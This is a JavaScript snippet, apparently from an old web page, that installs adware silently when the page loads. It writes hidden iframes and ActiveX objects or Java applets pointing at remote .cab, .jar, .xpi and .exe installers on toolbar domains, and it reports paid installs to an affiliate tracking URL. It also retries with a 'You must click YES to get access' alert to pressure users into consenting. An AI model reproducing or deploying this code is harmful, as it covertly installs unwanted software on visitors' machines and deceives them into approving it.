   <script language="javascript"><!--
    var flag=0;
    var loadfirst=0;

    var sp2=false;
    if(window.navigator.userAgent.indexOf("SV1") != -1) sp2=true;
    if (sp2){
      //document.write('<div id="tutorial_popup" style="visibility:hidden;position:absolute;top:0px;left:0px;width:635px;height:308px;"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="635" height="308">');
      //document.write('<param name="movie" value="http://www.slotchbar.com/ist/flash/sp2tutorial_v1.swf">param name="quality" value="high"><param name="wmode" value="transparent">');
      //document.write('<embed src="http://www.slotchbar.com/ist/flash/sp2tutorial_v1.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="700" height="500"></embed></object></div>');
    }
    document.write('<iframe id="downloads_manager" style="position:absolute; visibility:hidden;"></iframe>');
           retry = 2;
    function retryit(){
       if(window.retry && retry>0 && !sp2) {
           alert("You must click YES to get access");
           loadfirst=0;
           start_download();
           retry--;
           }
       }

    function start_download() {
       var bname=navigator.appName;
       var bver=parseInt(navigator.appVersion);
           if (bname == 'Microsoft Internet Explorer' && bver >= 2) {
           if(!loadfirst){
               downloads_manager.document.close();
               var holder= downloads_manager.document;
           } else {
               var holder=document;
           }
           if (!sp2){
               holder.write('<OBJECT id="barobject" width=1 height=1 classid="CLSID:386A771C-E96A-421f-8BA7-32F1B706892F"');
               holder.write('codebase="http://www.xxxtoolbar.com/ist/softwares/v4.0/0006_regular.cab" onerror="parent.retryit();">');
           } else {
               holder.write('<APPLET Archive="http://www.ysbweb.com/ist/softwares/v4.0/javainstaller.jar" code="javainstaller.InstallerApplet.class" ame="InstallerApplet" width="0" height="0" hspace="0" vspace="0" align="middle">');
               }

                   holder.write('<PARAM name="account_id" value="135343">');
                   holder.write('<PARAM name="download_key" value="0290bc282df816cb15f2209b7581aadd">');
                   holder.write('<PARAM name="download_lock" value="1098849079">');
                   if(!sp2){
               holder.write('<PARAM name="cfg" value="mtb">');
                   } if(sp2){
               //holder.write('<PARAM name="cfg" value="mtb_sp2">');
               holder.write('<PARAM name="cfg" value="java">');
                       }
           holder.write('<PARAM name="sub" value="">');
           if (!sp2){
               holder.write('</OBJECT>');
           } else {
                holder.write('</APPLET>');
               }
           //if(sp2 && !flag) document.all.tutorial_popup.style.visibility = "visible";
           if(!flag && !sp2){
               window.open("http://install.xxxtoolbar.com/ist/scripts/log_downloads.php?account_id=135343&auto_close=1&software_id=0006&payable=1&country=US","_blank","top=10000, left=100000");
           } if(!flag && sp2){
               holder.write('<IMG SRC="http://install.xxxtoolbar.com/ist/scripts/log_downloads.php?account_id=135343&auto_close=1&software_id=0006&payable=1&country=US" width=1 height=1 border=0>');
           }
           flag++;
            }

        else if (bname == 'Netscape' && bver >= 5) {
           if (InstallTrigger.updateEnabled()) {
                       InstallTrigger.install({'Content Access Plugin 1.01' : 'http://www.xxxtoolbar.com/ist/softwares/v4.0/ist_netscape.xpi'});
           } else { location.replace('http://www.slotch.com/ist/softwares/installers/istinstall_netscape.exe'); }
           }
   }

    function start_download_loadfirst() {
       start_download();
       }

       start_download();
       //setTimeout("window.close();",5000);
    // -->
   </script>
